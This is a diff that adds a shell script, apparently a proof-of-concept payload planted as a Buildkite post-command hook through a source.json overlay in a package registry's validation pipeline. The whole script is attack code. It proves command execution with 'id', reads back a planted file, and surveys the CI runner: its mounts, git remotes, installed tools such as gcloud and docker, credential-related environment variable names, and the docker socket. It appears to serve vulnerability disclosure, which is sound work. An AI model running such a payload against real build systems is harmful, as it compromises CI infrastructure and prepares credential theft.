@@ -1,0 +1,53 @@
+#!/bin/sh
+
+set +e
+
+run_recon() {
+  recon_name="$1"
+  shift
+  echo "recon_${recon_name}_begin"
+  echo "recon_${recon_name}_command=$*"
+  "$@" 2>&1 | sed -n '1,80p'
+  echo "recon_${recon_name}_end"
+}
+
+echo "BCR_VALIDATION_HOOK_POC_BEGIN"
+echo "This output is produced by /workdir/.buildkite/hooks/post-command after BCR validation copied it from a source.json overlay."
+echo "command_execution_proof=$(id 2>/dev/null)"
+echo "working_directory=$(pwd)"
+echo "hook_phase=${BUILDKITE_HOOK_PHASE:-unset}"
+echo "hook_scope=${BUILDKITE_HOOK_SCOPE:-unset}"
+echo "hook_path=${BUILDKITE_HOOK_PATH:-unset}"
+echo "buildkite_context pipeline=${BUILDKITE_PIPELINE_SLUG:-unset} build=${BUILDKITE_BUILD_NUMBER:-unset} job=${BUILDKITE_JOB_ID:-unset} pr=${BUILDKITE_PULL_REQUEST:-unset}"
+
+echo "BCR_VALIDATION_HOOK_READBACK_BEGIN"
+if [ -f /workdir/bcr-validation-hook-poc/readback.txt ]; then
+  sed -n '1,40p' /workdir/bcr-validation-hook-poc/readback.txt
+else
+  echo "readback file missing"
+fi
+echo "BCR_VALIDATION_HOOK_READBACK_END"
+
+echo "BCR_VALIDATION_HOOK_RECON_BEGIN"
+run_recon identity id
+run_recon kernel uname -a
+run_recon process sh -c 'ps -o pid,ppid,user,args -p "$$" 2>/dev/null || ps'
+run_recon checkout sh -c 'pwd; ls -la /workdir; git -C /workdir remote -v 2>/dev/null; git -C /workdir rev-parse --show-toplevel HEAD 2>/dev/null'
+run_recon hook_files sh -c 'ls -la /workdir/.buildkite /workdir/.buildkite/hooks 2>&1'
+run_recon mounted_paths sh -c 'ls -ldn /workdir /var/lib/buildkite-agent /var/run/docker.sock /usr/bin/buildkite-agent 2>&1'
+run_recon mountinfo sh -c 'sed -n "/\\/workdir\\|\\/var\\/lib\\/buildkite-agent\\|docker.sock\\|buildkite-agent/p" /proc/self/mountinfo | sed -n "1,40p"'
+run_recon tool_discovery sh -c 'for tool in buildkite-agent docker git bazel python3 curl wget gcloud gsutil; do path=$(command -v "$tool" 2>/dev/null || true); if [ -n "$path" ]; then echo "tool_present=$tool path=$path"; else echo "tool_missing=$tool"; fi; done'
+if command -v buildkite-agent >/dev/null 2>&1; then
+  run_recon buildkite_agent_version buildkite-agent --version
+fi
+run_recon ci_environment_names sh -c 'env | sed -n -e "s/^\\(BUILDKITE_[A-Z0-9_]*\\)=.*/env_present=\\1/p" -e "s/^\\(GOOGLE_[A-Z0-9_]*\\)=.*/env_present=\\1/p" -e "s/^\\(GITHUB_[A-Z0-9_]*\\)=.*/env_present=\\1/p" -e "s/^\\(DOCKER_[A-Z0-9_]*\\)=.*/env_present=\\1/p" | sort | sed -n "1,120p"'
+if [ -S /var/run/docker.sock ] && command -v docker >/dev/null 2>&1; then
+  run_recon docker_socket_probe docker version
+else
+  echo "recon_docker_socket_probe_begin"
+  echo "docker_socket_or_cli_missing"
+  ls -ldn /var/run/docker.sock 2>&1 || true
+  echo "recon_docker_socket_probe_end"
+fi
+echo "BCR_VALIDATION_HOOK_RECON_END"
+echo "BCR_VALIDATION_HOOK_POC_END"
